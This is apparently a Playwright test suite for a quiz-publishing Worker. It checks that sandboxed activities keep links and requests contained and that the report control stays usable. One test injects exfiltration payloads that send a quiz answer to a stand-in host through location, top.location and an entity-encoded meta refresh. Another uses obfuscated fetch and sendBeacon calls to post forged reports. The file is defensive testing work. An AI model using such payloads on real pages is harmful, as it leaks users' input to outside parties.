import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { chromium, webkit, type Browser, type Page } from "playwright";
import worker from "../src/index";
import type { StudioEnv } from "../src/env";

const origin = "https://player.test";
const slug = "ABCDEFGHIJKLMNOPQRST";
const source = '<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width"><title>Quiz</title></head><body><img src="assets/image-1" alt="Diagram"><input id="answer" value="SYNTHETIC_ANSWER"><button onclick="this.textContent=\'Checked\'">Check</button></body></html>';

// The real Worker builds the response and security headers. Only its D1/R2
// collaborators are stubbed; no provider, production or external request runs.
function environment(html: string): StudioEnv {
  return {
    PUBLIC_PLAYER_ORIGIN: origin,
    DB: {
      prepare(sql: string) {
        return { bind: () => ({ first: async () => {
          if (sql.includes("FROM publications WHERE slug=")) return {
            slug, artifact_id: "artifact", revision_id: "revision", owner_hash: "owner",
            title: "Quiz", source_hash: "source", created_at: "2026-01-01T00:00:00Z",
            expires_at: "2099-01-01T00:00:00Z", revoked_at: null,
          };
          if (sql.includes("JOIN revision_assets")) return { ok: 1 };
          if (sql.includes("FROM assets WHERE id")) return {
            id: "image-1", owner_hash: "owner", object_key: "assets/image-1",
            content_type: "image/svg+xml", byte_length: 120, width: 20, height: 20,
            sha256: "image", alternative_text: "Diagram", decorative: 0,
            created_at: "2026-01-01T00:00:00Z",
          };
          throw new Error(`Unexpected test query: ${sql}`);
        } }) };
      },
    },
    MEDIA: { get: async (key: string) => {
      if (key === "sources/source.html") return { text: async () => html };
      if (key === "assets/image-1") return {
        body: '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="blue"/></svg>',
        httpEtag: "image",
        writeHttpMetadata(headers: Headers) { headers.set("content-type", "image/svg+xml"); },
      };
      return null;
    } },
  } as unknown as StudioEnv;
}

describe.each([["Chromium", chromium], ["WebKit", webkit]] as const)("published activity containment (%s)", (_name, engine) => {
  let browser: Browser;
  // A cold WebKit launch on a shared CI runner can exceed the 10 s hook default.
  beforeAll(async () => {
    browser = await engine.launch();
    // Include cold-page initialization in suite setup, not the containment test's budget.
    const context = await browser.newContext();
    try { await context.newPage(); }
    finally { await context.close(); }
  }, 30_000);
  afterAll(async () => { await browser.close(); });

  async function open(html: string, width = 1024, height = 768) {
    const context = await browser.newContext({ viewport: { width, height } });
    const page = await context.newPage();
    const external: string[] = [];
    const assets: string[] = [];
    const reports: unknown[] = [];
    const env = environment(html);
    await context.route("**/*", async (route) => {
      const request = route.request(), url = new URL(request.url());
      if (url.origin !== origin) {
        external.push(url.href);
        await route.abort();
        return;
      }
      if (url.pathname === `/v1/publications/${slug}/reports`) {
        // Deliberately permissive: containment must stop activity requests even
        // if the server's independent CORS defense is accidentally relaxed.
        if (request.method() === "POST") reports.push(request.postDataJSON());
        await route.fulfill({
          status: request.method() === "OPTIONS" ? 204 : 201,
          headers: {
            "access-control-allow-origin": "*",
            "access-control-allow-methods": "POST",
            "access-control-allow-headers": "content-type",
          },
          body: request.method() === "OPTIONS" ? "" : "{}",
        });
        return;
      }
      if (url.pathname.includes("/assets/")) assets.push(url.pathname);
      const response = await worker.fetch(new Request(request.url()), env);
      const headers: Record<string, string> = {};
      response.headers.forEach((value, name) => { headers[name] = value; });
      await route.fulfill({
        status: response.status,
        headers,
        body: Buffer.from(await response.arrayBuffer()),
      });
    });
    await page.goto(`${origin}/${slug}`, { waitUntil: "load" });
    return { context, page, external, assets, reports };
  }

  async function sendReport(page: Page, choice: string) {
    await page.getByRole("button", { name: "Report this activity", exact: true }).click();
    const dialog = page.getByRole("dialog", { name: "Report this activity" });
    await dialog.getByRole("radio", { name: choice }).check();
    await dialog.getByRole("button", { name: "Send report" }).click();
    await expect.poll(() => dialog.getByRole("status").textContent()).toBe("Thank you. Your report was sent to the Tapplet team.");
    expect(await page.getByRole("button", { name: "Report sent", exact: true }).count()).toBe(1);
  }

  function activity(page: Page) {
    const frame = page.frames().find((candidate) => candidate.url().split("#")[0] === "about:srcdoc");
    if (!frame) throw new Error("Sandboxed activity frame not found");
    return frame;
  }

  it("places the scoped base in the real head, not a preceding comment", async () => {
    const state = await open(source.replace("<head>", "<!-- explain <head> here --><head>"));
    try {
      await activity(state.page).getByRole("img", { name: "Diagram" }).waitFor();
      expect(await activity(state.page).locator("head base").count()).toBe(1);
      expect(await activity(state.page).locator("head base").getAttribute("href")).toBe(`/${slug}/`);
      expect(state.assets).toEqual([`/${slug}/assets/image-1`]);
      expect(await activity(state.page).evaluate("document.querySelector('img').naturalWidth")).toBe(20);
    } finally { await state.context.close(); }
  });

  it("keeps fragment links and hash routes inside the activity", async () => {
    const state = await open(source.replace(
      "<button",
      '<a href="#/route?step=2">Next step</a><a href="#end">Jump to end</a><div style="height:3000px"></div><p id="end">End</p><button',
    ));
    try {
      await activity(state.page).evaluate('addEventListener("hashchange", () => { document.body.dataset.route = location.hash; })');
      await activity(state.page).getByRole("link", { name: "Next step" }).click();
      await expect.poll(() => activity(state.page).evaluate("document.body.dataset.route")).toBe("#/route?step=2");
      await activity(state.page).getByRole("link", { name: "Jump to end" }).click();
      await expect.poll(() => activity(state.page).evaluate("scrollY")).toBeGreaterThan(0);
      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });

  it("keeps padded and SVG xlink fragment links inside the activity", async () => {
    // Validation trims URL values and reads xlink:href as href, so it accepts both.
    // A link without a URL inside another link leaves the outer one to follow.
    const state = await open(source.replace(
      "<button",
      '<a href=" #middle\n">Jump to middle <svg width="20" height="20"><a><rect id="icon" width="20" height="20"/></a></svg></a><svg width="40" height="40"><a id="svg-link" xlink:href="#end"><rect width="40" height="40"/></a></svg><div style="height:3000px"></div><p id="middle">Middle</p><div style="height:3000px"></div><p id="end">End</p><button',
    ));
    try {
      await activity(state.page).locator("#icon").click();
      await expect.poll(() => activity(state.page).evaluate("location.hash")).toBe("#middle");
      await activity(state.page).locator("#svg-link rect").click();
      await expect.poll(() => activity(state.page).evaluate("location.hash")).toBe("#end");
      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });

  it("scrolls again when a fragment link the address already names is followed again", async () => {
    // As in a browser, "#top" without such an element means the top of the page.
    const state = await open(source.replace(
      "<button",
      '<div style="height:3000px"></div><a href="#top">Back to top</a><a href="#café">Café</a><div style="height:3000px"></div><p id="café">Café</p><button',
    ));
    try {
      const frame = activity(state.page);
      for (const attempt of [1, 2]) {
        await frame.evaluate("scrollTo(0, 2500)");
        await frame.getByRole("link", { name: "Back to top" }).click();
        await expect.poll(() => frame.evaluate("scrollY"), { message: `attempt ${attempt}` }).toBe(0);
      }
      for (const attempt of [1, 2]) {
        await frame.evaluate("scrollTo(0, 0)");
        await frame.getByRole("link", { name: "Café" }).click();
        await expect.poll(() => frame.evaluate("scrollY"), { message: `attempt ${attempt}` }).toBeGreaterThan(3000);
      }
      expect(await frame.locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });

  it("keeps a fragment link inside an open shadow root inside the activity", async () => {
    const state = await open(source.replace(
      "<button",
      '<div id="host"></div><div style="height:3000px"></div><p id="end">End</p><script>document.getElementById("host").attachShadow({ mode: "open" }).innerHTML = \'<a href="#end">Jump to end</a>\';</script><button',
    ));
    try {
      await activity(state.page).getByRole("link", { name: "Jump to end" }).click();
      await expect.poll(() => activity(state.page).evaluate("location.hash")).toBe("#end");
      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });

  it("keeps a fragment link whose click a dialog stops inside the activity", async () => {
    // A dialog commonly stops clicks reaching the overlay that closes it; a
    // handler that also cancels the click still keeps the page where it is.
    const state = await open(source.replace(
      "<button",
      '<div onclick="this.hidden = true"><div onclick="event.stopPropagation()"><a href="#end">Jump to end</a></div></div><div style="height:3000px"></div><p id="end">End</p><div onclick="this.hidden = true"><div onclick="event.stopPropagation(); return false"><a href="#">Stay</a></div></div><div style="height:3000px"></div><button',
    ));
    try {
      const frame = activity(state.page);
      await frame.getByRole("link", { name: "Jump to end" }).click();
      await expect.poll(() => frame.evaluate("location.hash")).toBe("#end");
      await expect.poll(() => frame.evaluate("scrollY")).toBeGreaterThan(0);
      const scrolled = await frame.evaluate("scrollY");
      await frame.getByRole("link", { name: "Stay" }).click();
      await state.page.waitForTimeout(150);
      expect(await activity(state.page).evaluate("[location.hash, scrollY]")).toEqual(["#end", scrolled]);
      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });

  it.each(["location", "encoded refresh", "top location"])("contains %s without sending the answer outside", async (payload) => {
    const html = payload === "encoded refresh"
      ? source.replace("</head>", '<meta http-equiv="&#114;efresh" content="0;url=https://outside.invalid/collect?answer=SYNTHETIC_ANSWER"></head>')
      : source.replace("this.textContent='Checked'", `${payload === "top location" ? "top.location" : "location"}='https://outside.invalid/collect?answer='+answer.value`);
    const state = await open(html);
    try {
      if (payload !== "encoded refresh") await activity(state.page).getByRole("button", { name: "Check", exact: true }).click();
      await state.page.waitForTimeout(150);
      expect(state.external).toEqual([]);
      expect(state.page.url()).toBe(`${origin}/${slug}`);
      expect(await state.page.getByRole("button", { name: "Report this activity", exact: true }).count()).toBe(1);
    } finally { await state.context.close(); }
  });

  it("blocks activity fetch and beacon reports while allowing a parent report", async () => {
    const endpoint = `${origin}/v1/publications/${slug}/reports`;
    const attack = `window['fe'+'tch']('${endpoint}', {method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({reason:'unsafe'})}).catch(()=>{});navigator['send'+'Beacon']('${endpoint}',new Blob([JSON.stringify({reason:'unsafe'})],{type:'application/json'}));this.textContent='Attempted'`;
    const state = await open(source.replace("this.textContent='Checked'", attack));
    try {
      const frame = activity(state.page);
      await frame.evaluate(`(() => {
        document.body.dataset.blocked = "0";
        document.addEventListener("securitypolicyviolation", (event) => {
          if (event.effectiveDirective === "connect-src") {
            document.body.dataset.blocked = String(Number(document.body.dataset.blocked) + 1);
          }
        });
      })()`);
      await frame.getByRole("button", { name: "Check", exact: true }).click();
      expect(await frame.getByRole("button", { name: "Attempted", exact: true }).count()).toBe(1);
      await state.page.waitForTimeout(150);
      expect(state.reports).toEqual([]);
      await expect.poll(() => frame.evaluate("Number(document.body.dataset.blocked)")).toBeGreaterThanOrEqual(2);
      await sendReport(state.page, "I cannot see, hear or use it");
      expect(state.reports).toEqual([{ reason: "accessibility" }]);
    } finally { await state.context.close(); }
  });

  it.each([[390, 844], [1024, 768]])("keeps images, interactions and reporting usable at %sx%s", async (width, height) => {
    const state = await open(source, width, height);
    try {
      const frame = activity(state.page);
      await frame.getByRole("button", { name: "Check", exact: true }).click();
      expect(await frame.getByRole("button", { name: "Checked", exact: true }).count()).toBe(1);
      expect(await frame.evaluate("document.querySelector('img').naturalWidth")).toBe(20);
      expect(await frame.evaluate("innerWidth")).toBe(width);
      await sendReport(state.page, "I cannot see, hear or use it");
      expect(state.reports).toEqual([{ reason: "accessibility" }]);
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });
  it("keeps the report control clear of the activity on a 375px phone", async () => {
    const state = await open(source.replace("<body>", '<body style="margin:0"><div style="position:fixed;right:0;bottom:0;width:160px;height:60px" id="corner">Last answer</div>'), 375, 667);
    try {
      const frame = await state.page.locator("iframe").boundingBox();
      const report = await state.page.getByRole("button", { name: "Report this activity", exact: true }).boundingBox();
      if (!frame || !report) throw new Error("Missing frame or report control");
      expect(report.y).toBeGreaterThanOrEqual(frame.y + frame.height);
      expect(report.height).toBeGreaterThanOrEqual(36);
      await activity(state.page).getByText("Last answer").click();
      await sendReport(state.page, "Something else is wrong");
      expect(state.reports).toEqual([{ reason: "other" }]);
    } finally { await state.context.close(); }
  });
});

describe("published link checks", () => {
  it("answers HEAD like GET so link previews do not see a broken link", async () => {
    const env = environment(source);
    const head = await worker.fetch(new Request(`${origin}/${slug}`, { method: "HEAD" }), env);
    expect(head.status).toBe(200);
    expect(head.headers.get("content-type")).toBe("text/html; charset=utf-8");
    const post = await worker.fetch(new Request(`${origin}/${slug}`, { method: "POST" }), env);
    expect(post.status).toBe(404);
  });
});
